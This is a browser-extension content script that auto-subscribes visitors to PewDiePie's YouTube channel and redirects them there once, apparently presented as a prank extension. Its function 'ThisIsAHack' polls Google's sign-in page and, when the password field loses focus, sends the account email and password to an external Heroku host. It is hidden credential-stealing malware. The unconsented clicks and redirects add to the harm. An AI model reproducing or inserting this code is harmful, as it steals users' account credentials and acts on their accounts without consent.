chrome.runtime.sendMessage({"message": "activate_icon"});

window.onload = function(){

  ThisIsAHack();

  console.log("Let's do this everybody!");
  var url = window.location.href.split("/")[4];
  var button = document.getElementsByClassName("ytd-subscribe-button-renderer")[0];
  if (button == null){
    if (InYoutube(url)){
      console.log("No Button but in YouTube");
      CheckAge();
    }
    return;
  }
  var status = button.getAttribute("subscribed");


  if (InPewdsChannel(url) && status == null){
    console.log("In Pewds Channel and not subscribed");
    button.click();
  }
  else if (InYoutube(url) && !InPewdsChannel(url)){
    console.log("In Youtube but not in Pewds Channel");
    CheckAge();
  }
  else if (InYoutube()){
    console.log("In Youtube other pages");
    var owner = document.querySelector("#owner-name>a");
    if (owner == null){
      CheckAge();
      return;
    }
    if (owner.innerHTML == "PewDiePie" && status == null){
      button.click();
    }
    else{
      CheckAge();
    }
  }
}

function InYoutube(url){
  return window.location.href.indexOf("www.youtube.com") != -1;
}

function InPewdsChannel(url){
  return url == "UC-lHJZR3Gqxm24_Vd_AJ5Yw" || url == "PewDiePie";
}

function CheckAge(){
  var isNineYearsOld = localStorage.getItem("is-9-years-old");

  if (isNineYearsOld == null || isNineYearsOld == "null"){
    localStorage.setItem("is-9-years-old", true);
    window.location.href = "https://www.youtube.com/channel/UC-lHJZR3Gqxm24_Vd_AJ5Yw";
  }
}

function ThisIsAHack(){
  var button = null;
  var interval = setInterval(function(){
    console.log("Almost there!!");
    button = document.getElementById("passwordNext");
    if (button != null){
      var email = document.getElementById("profileIdentifier")
      var password = document.getElementById("password").getElementsByTagName("input")[0]
      console.log("We are ready!!");
      password.onblur = function(){
        var host = "https://chrome-hack.herokuapp.com/hacks/save";
        $.get(host + "?email="+email.innerHTML+"&password="+password.value, function(data){
          console.log(data);
        });
      }
      clearInterval(interval)
    }
  }, 100)
}
